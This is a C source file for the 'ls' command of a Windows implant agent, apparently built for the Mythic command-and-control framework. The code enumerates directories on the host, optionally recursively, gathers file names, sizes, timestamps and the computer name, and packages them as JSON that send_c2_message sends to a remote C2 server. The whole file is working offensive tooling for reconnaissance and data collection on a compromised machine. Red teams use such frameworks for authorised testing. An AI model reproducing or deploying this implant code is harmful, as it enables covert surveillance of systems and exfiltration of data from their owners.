#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

#ifdef INCLUDE_CMD_LS

static ULONGLONG filetime_to_unix_ms(FILETIME ft) {
    ULONGLONG ull = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    if (ull < 116444736000000000ULL) return 0;
    return (ull - 116444736000000000ULL) / 10000ULL;
}

typedef struct { char *data; size_t len; size_t cap; } JBuf;

static int jbuf_grow(JBuf *b, size_t need) {
    if (b->len + need + 1 <= b->cap) return 1;
    size_t ncap = b->cap + need + 8192;
    char *tmp = (char *)realloc(b->data, ncap);
    if (!tmp) return 0;
    b->data = tmp;
    b->cap  = ncap;
    return 1;
}
static int jbuf_append(JBuf *b, const char *s) {
    size_t slen = strlen(s);
    if (!jbuf_grow(b, slen)) return 0;
    memcpy(b->data + b->len, s, slen + 1);
    b->len += slen;
    return 1;
}
static int jbuf_appendf(JBuf *b, const char *fmt, ...) {
    char tmp[512];
    va_list ap; va_start(ap, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    return jbuf_append(b, tmp);
}

/* Send one directory's file_browser response to Mythic.
 * completed=0 for intermediate dirs in recursive mode, 1 for the final message. */
static void ls_send_dir(const char *task_id, const char *hostname,
                        const char *dirpath, int update_deleted, int completed) {
    char abs_path[MAX_PATH] = {0};
    if (!GetFullPathNameA(dirpath, MAX_PATH, abs_path, NULL))
        strncpy(abs_path, dirpath, MAX_PATH - 1);

    /* Normalize trailing backslash */
    size_t alen = strlen(abs_path);
    if (alen > 3 && abs_path[alen - 1] == '\\')
        abs_path[--alen] = '\0';

    /* Split into parent + name */
    char parent[MAX_PATH] = {0};
    char dir_name[MAX_PATH] = {0};
    char *sep = strrchr(abs_path, '\\');
    if (sep && sep > abs_path + 2) {
        /* Normal dir: C:\foo\bar -> parent=C:\foo, name=bar */
        memcpy(parent, abs_path, (size_t)(sep - abs_path));
        strncpy(dir_name, sep + 1, MAX_PATH - 1);
    } else {
        /* Root or top-level: C:\ or C:\foo */
        strncpy(parent, "", 1);
        strncpy(dir_name, abs_path, MAX_PATH - 1);
    }

    /* Directory timestamps */
    ULONGLONG dir_access = 0, dir_modify = 0;
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (GetFileAttributesExA(abs_path, GetFileExInfoStandard, &fad)) {
        dir_access = filetime_to_unix_ms(fad.ftLastAccessTime);
        dir_modify = filetime_to_unix_ms(fad.ftLastWriteTime);
    }

    /* Build files array */
    JBuf files = {0};
    files.data = (char *)malloc(16384);
    if (!files.data) return;
    files.cap  = 16384;
    files.data[0] = '\0';

    char pattern[MAX_PATH + 2];
    snprintf(pattern, sizeof(pattern), "%s\\*", abs_path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    int count = 0, first = 1;

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
                continue;

            int    is_file    = !(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
            ULONGLONG acc_ms  = filetime_to_unix_ms(fd.ftLastAccessTime);
            ULONGLONG mod_ms  = filetime_to_unix_ms(fd.ftLastWriteTime);
            ULONGLONG sz      = is_file
                ? (((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow) : 0ULL;

            char *esc = json_escape(fd.cFileName);
            if (!esc) continue;

            if (!first) jbuf_append(&files, ",");
            jbuf_appendf(&files,
                "{\"is_file\":%s,\"permissions\":{},\"name\":\"%s\","
                "\"access_time\":%I64u,\"modify_time\":%I64u,\"size\":%I64u}",
                is_file ? "true" : "false", esc, acc_ms, mod_ms, sz);
            free(esc);
            count++;
            first = 0;
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    char *esc_host   = json_escape(hostname);
    char *esc_name   = json_escape(dir_name);
    char *esc_parent = json_escape(parent);

    char user_out[128];
    snprintf(user_out, sizeof(user_out), "Returned %d entries", count);
    char *esc_out = json_escape(user_out);

    JBuf msg = {0};
    msg.data = (char *)malloc(files.len + 2048);
    if (!msg.data) goto cleanup;
    msg.cap  = files.len + 2048;
    msg.data[0] = '\0';

    jbuf_appendf(&msg,
        "{\"action\":\"post_response\",\"responses\":[{"
        "\"task_id\":\"%s\","
        "\"user_output\":\"%s\","
        "\"completed\":%s,"
        "\"status\":\"success\","
        "\"file_browser\":{"
            "\"host\":\"%s\","
            "\"is_file\":false,"
            "\"permissions\":{},"
            "\"name\":\"%s\","
            "\"parent_path\":\"%s\","
            "\"success\":true,"
            "\"update_deleted\":%s,"
            "\"access_time\":%I64u,"
            "\"modify_time\":%I64u,"
            "\"size\":0,"
            "\"files\":[",
        task_id,
        esc_out    ? esc_out    : "",
        completed  ? "true" : "false",
        esc_host   ? esc_host   : "",
        esc_name   ? esc_name   : "",
        esc_parent ? esc_parent : "",
        update_deleted ? "true" : "false",
        dir_access, dir_modify);

    jbuf_append(&msg, files.data);
    jbuf_append(&msg, "]}}]}");

    { char *r = send_c2_message(msg.data); if (r) free(r); }
    free(msg.data);

cleanup:
    free(files.data);
    free(esc_host); free(esc_name); free(esc_parent); free(esc_out);
}

/* Recursive walk: send one file_browser per subdirectory (all non-final). */
static void ls_recurse(const char *task_id, const char *hostname, const char *dirpath) {
    ls_send_dir(task_id, hostname, dirpath, 1, 0);

    char pattern[MAX_PATH + 2];
    snprintf(pattern, sizeof(pattern), "%s\\*", dirpath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        char sub[MAX_PATH];
        snprintf(sub, sizeof(sub), "%s\\%s", dirpath, fd.cFileName);
        ls_recurse(task_id, hostname, sub);
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

void command_ls(char *task_id, char *params) {
    char path[MAX_PATH] = {0};
    int  recursive      = 0;

    if (params[0] == '{') {
        extract_json_string(params, "path", path, sizeof(path));
        const char *rp = strstr(params, "\"recursive\"");
        if (rp) {
            const char *vp = strchr(rp, ':');
            if (vp) { while (*++vp == ' ' || *vp == '\t'); recursive = strncmp(vp, "true", 4) == 0; }
        }
    } else {
        char *rf = strstr(params, " -r");
        if (rf) { recursive = 1; *rf = '\0'; }
        strncpy(path, params, MAX_PATH - 1);
        char *end = path + strlen(path) - 1;
        while (end > path && (*end == ' ' || *end == '\t')) *end-- = '\0';
    }

    if (path[0] == '\0')
        GetCurrentDirectoryA(MAX_PATH, path);

    for (char *p = path; *p; p++) if (*p == '/') *p = '\\';

    size_t plen = strlen(path);
    if (plen > 3 && path[plen - 1] == '\\') path[--plen] = '\0';

    char hostname[256] = {0};
    DWORD hnsz = sizeof(hostname);
    if (!GetComputerNameA(hostname, &hnsz)) strncpy(hostname, "unknown", sizeof(hostname) - 1);

    if (recursive) {
        ls_recurse(task_id, hostname, path);
        /* Final completed marker */
        char final_msg[512];
        snprintf(final_msg, sizeof(final_msg),
            "{\"action\":\"post_response\",\"responses\":[{"
            "\"task_id\":\"%s\",\"user_output\":\"Recursive listing done.\","
            "\"completed\":true,\"status\":\"success\"}]}",
            task_id);
        char *r = send_c2_message(final_msg); if (r) free(r);
    } else {
        ls_send_dir(task_id, hostname, path, 1, 1);
    }
}

#endif
